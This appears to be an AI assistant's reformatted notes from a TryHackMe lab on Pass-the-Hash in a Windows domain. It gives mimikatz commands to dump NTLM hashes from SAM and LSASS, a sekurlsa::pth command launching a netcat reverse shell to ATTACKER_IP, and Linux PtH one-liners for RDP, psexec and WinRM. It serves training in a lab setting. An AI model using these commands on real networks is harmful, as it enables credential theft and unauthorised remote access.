Apologies for the confusion. Here is the reorganized structure with the titles in bold:

**Pass-the-Hash (PtH)** is a technique used to authenticate to a system without knowing the plaintext password by using the NTLM password hash instead. This method is applicable when the Windows domain is configured to use NTLM authentication.

**Extracting NTLM hashes from local SAM:**

1. Open PowerShell on THMJMP2 and run the following commands with mimikatz:
   ```
   mimikatz # privilege::debug
   mimikatz # token::elevate
   mimikatz # lsadump::sam
   ```
   This method will provide you with NTLM hashes of local users on the machine. Domain user hashes will not be available.

**Extracting NTLM hashes from LSASS memory:**

2. Open PowerShell on THMJMP2 and run the following commands with mimikatz:
   ```
   mimikatz # privilege::debug
   mimikatz # token::elevate
   mimikatz # sekurlsa::msv
   ```
   This method will allow you to extract NTLM hashes of both local users and domain users who have recently logged onto the machine.

**Performing a PtH attack:**

Once you have the NTLM hashes, you can perform a PtH attack using mimikatz. Inject an access token for the victim user on a reverse shell or any desired command by running the following commands:
```
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```
Make sure to revert to the original token privileges with `token::revert` before performing the PtH attack. This will spawn a new reverse shell, allowing you to execute commands as the victim user.

To receive the reverse shell, run a reverse listener on your AttackBox using the following command:
```
user@AttackBox$ nc -lvp 5555
```
If you run the `whoami` command on this shell, it will show the original user you were using before the PtH attack. However, any commands executed from this shell will use the injected credentials.

**Passing the Hash Using Linux:**

If you have access to a Linux box (like your AttackBox), you can use built-in tools to perform PtH using different protocols:

- Connect to RDP using PtH: `xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`
- Connect via psexec using PtH: `psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`
  (Note: Only the Linux version of psexec supports PtH)
- Connect to WinRM using PtH: `evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`

These commands demonstrate how to perform PtH using Linux tools for RDP, psexec, and WinRM protocols, depending on the available services.